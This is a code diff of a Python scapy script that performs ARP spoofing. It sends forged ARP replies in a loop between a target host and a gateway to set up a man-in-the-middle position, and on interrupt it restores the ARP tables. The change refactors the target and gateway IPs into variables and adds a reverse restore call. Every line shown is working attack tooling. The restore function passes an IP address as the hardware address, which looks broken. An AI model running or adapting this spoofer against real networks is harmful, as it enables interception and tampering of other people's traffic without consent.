@@ -22,14 +22,18 @@ def restore(destination_ip, source_ip):
     packet = scapy.ARP(op=2, pdst=destination_ip, hwdst=source_ip, psrc=source_ip, hwsrc=source_mac)
     scapy.send(packet, count=4, verbose=False)
 
+target_ip = "10.0.0.1"
+gateway_ip = "10.0.1.1"
+
 try:
     sent_packets_count = 0
     while True:
-        spoof("10.0.0.1", "10.0.1.1")
-        spoof("10.0.1.1", "10.0.0.1")
+        spoof(target_ip, gateway_ip)
+        spoof(gateway_ip, target_ip)
         sent_packets_count = sent_packets_count + 2
         print("\r[+] Packets sent: " + str(sent_packets_count), end="")
         time.sleep(2)
 except KeyboardInterrupt:
     print("[+] Detected CTRL + C Input... Resetting ARP tables... Please wait.\n")
-    restore("10.0.0.1", "10.0.1.1")
+    restore(target_ip, gateway_ip)
+    restore(gateway_ip, target_ip)
